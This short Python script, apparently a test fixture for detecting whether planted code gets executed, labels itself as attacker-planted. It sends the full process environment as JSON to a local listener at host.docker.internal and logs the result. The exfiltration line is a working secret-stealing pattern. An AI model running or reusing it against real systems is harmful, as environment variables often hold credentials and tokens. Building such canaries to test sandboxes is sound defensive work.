"""Planted by an attacker. Sends the environment out and reports locally that it ran.

The local log keeps a blocked attempt distinct from an attack nobody ran.
"""

import json
import os
import urllib.request

try:
    urllib.request.urlopen(
        urllib.request.Request(
            "http://host.docker.internal:18099/induced",
            data=json.dumps(dict(os.environ)).encode(),
        ),
        timeout=4,
    )
    outcome = "sent"
except Exception as error:
    outcome = f"{type(error).__name__}: {error}"
os.makedirs(".tmp", exist_ok=True)
with open(".tmp/induced-ran.log", "a") as stream:
    stream.write(outcome + "\n")
